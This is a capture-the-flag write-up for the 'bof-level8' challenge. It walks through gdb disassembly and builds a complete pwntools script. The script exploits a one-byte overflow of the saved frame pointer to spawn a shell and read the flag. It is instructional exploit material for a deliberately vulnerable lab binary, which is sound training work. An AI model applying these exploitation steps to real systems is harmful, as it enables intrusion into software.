# Analysis
Once again, we are only able to overwrite %rbp. However, this time we are only able to overwrite a 
single byte. The general approach will be the same as level5, but we need to add just a little bit more
in order to make the attack work. 

First we can look at `receive_input()` in gdb to find the buffer. 
```gdb
   0x0000000000401211 <+0>:     endbr64
   0x0000000000401215 <+4>:     push   %rbp
   0x0000000000401216 <+5>:     mov    %rsp,%rbp
   0x0000000000401219 <+8>:     add    $0xffffffffffffff80,%rsp
   0x000000000040121d <+12>:    mov    0x2e3c(%rip),%rax        # 0x404060 <stdin@GLIBC_2.2.5>
   0x0000000000401224 <+19>:    mov    %rax,%rdx
   0x0000000000401227 <+22>:    mov    $0x100,%esi
   0x000000000040122c <+27>:    lea    0x2e4d(%rip),%rax        # 0x404080 <buffer>
   0x0000000000401233 <+34>:    mov    %rax,%rdi
   0x0000000000401236 <+37>:    call   0x401090 <fgets@plt>
   0x000000000040123b <+42>:    movl   $0x0,0x2f3b(%rip)        # 0x404180 <i>
   0x0000000000401245 <+52>:    jmp    0x401276 <receive_input+101>
   0x0000000000401247 <+54>:    mov    0x2f33(%rip),%eax        # 0x404180 <i>
   0x000000000040124d <+60>:    mov    0x2f2d(%rip),%ecx        # 0x404180 <i>
   0x0000000000401253 <+66>:    cltq
   0x0000000000401255 <+68>:    lea    0x2e24(%rip),%rdx        # 0x404080 <buffer>
   0x000000000040125c <+75>:    movzbl (%rax,%rdx,1),%edx
   0x0000000000401260 <+79>:    movslq %ecx,%rax
   0x0000000000401263 <+82>:    mov    %dl,-0x80(%rbp,%rax,1)
   0x0000000000401267 <+86>:    mov    0x2f13(%rip),%eax        # 0x404180 <i>
   0x000000000040126d <+92>:    add    $0x1,%eax
   0x0000000000401270 <+95>:    mov    %eax,0x2f0a(%rip)        # 0x404180 <i>
   0x0000000000401276 <+101>:   mov    0x2f04(%rip),%eax        # 0x404180 <i>
   0x000000000040127c <+107>:   cmp    $0x80,%eax
   0x0000000000401281 <+112>:   jle    0x401247 <receive_input+54>
   0x0000000000401283 <+114>:   nop
   0x0000000000401284 <+115>:   nop
   0x0000000000401285 <+116>:   leave
   0x0000000000401286 <+117>:   ret
```

At `receive_input+82`, we can see that the buffer we want to overflow is rbp-0x80. 
Now, we can start our script and open it up in gdb. 

```py
from pwn import *

p = process('./bof-levelx')
e = ELF('./bof-level8')

gas_addr = e.symbols['get_a_shell']

context.terminal = ['tmux', 'splitw', '-h']
gdb.attach(p, 'b *receive_input+116') 

s = cyclic(0x80)

string = s + b'A'

p.sendline(string)
p.interactive()
```
```gdb
*RBP  0x7fffffffd220 —▸ 0x7fffffffd241 ◂— 0xf200007fffffffd2
*RSP  0x7fffffffd1a0 ◂— 0x6161616261616161 ('aaaabaaa') 
```
In gdb, we see that there's a problem. While we can see the 0x41 at the end of %rbp, we could never make %rbp point 
to somewhere in the buffer because we only have control of the least significant byte of the address, and the second
least significant byte (0xd2) is too high.

In order to get around this, we can adjust what addresses the stack sits at by adding arbitrary environmental
variables to take up space. 

```py
env = {'a' : 'b'}
p = process('./bof-levelx', env=env)
```

Then we can run it again. 

```gdb
*RBP  0x7fffffffece0 —▸ 0x7fffffffed41 ◂— 0x8200000000000000
*RSP  0x7fffffffec60 ◂— 0x6161616261616161 ('aaaabaaa')
```

The addresses have moved, but we have the same problem. So let's do it again. 

```py
env = {'a' : 'b', 'b' : 'c'}
```
```gdb
*RBP  0x7fffffffecd0 —▸ 0x7fffffffec41 ◂— 0x3b0000000000403e /* '>@' */
*RSP  0x7fffffffec50 ◂— 0x6161616261616161 ('aaaabaaa')
```

Now we have it in the correct spot and can adjust the last byte of %rbp 
so that it lands somewhere in the buffer. The easiest point to do this is at
the beginning (0x50)

```py
i = s.find(b'aaaabaaa')

string = s[:i+8] + p64(gas_addr) + s[i+16:] + p64(0x50)
```

At this point, the exploit works and we can run it without the debugger on the
real program. 

# Full Script + Solve
```py
#!/usr/bin/python3

from pwn import *

env = {'a' : 'b', 'b' : 'c'}

p = process('./bof-level8', env=env)
e = ELF('./bof-level8')

gas_addr = e.symbols['get_a_shell']

s = cyclic(0x80)
i = s.find(b'aaaabaaa')

string = s[:i+8] + p64(gas_addr) + s[i+16:] + p64(0x50)

p.sendline(string)
p.interactive()
```
```
$ ./p.py
[+] Starting local process './bof-level8': pid 1142843
[*] '/home/sawyeras/week2/bof-level8/bof-level8'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Switching to interactive mode
Now, the developer of this program is trained a bit more, however,
still the vulnerability exists in th program: 1-byte overflow in the buffer,
which is an off-by-one vulnerability!
Can you exploit this program?
Spawning a privileged shell

$ cat flag
cand{nEv3r_eV3r_LeT_yOuR_bUfF3r_0v3rFlovv}
```
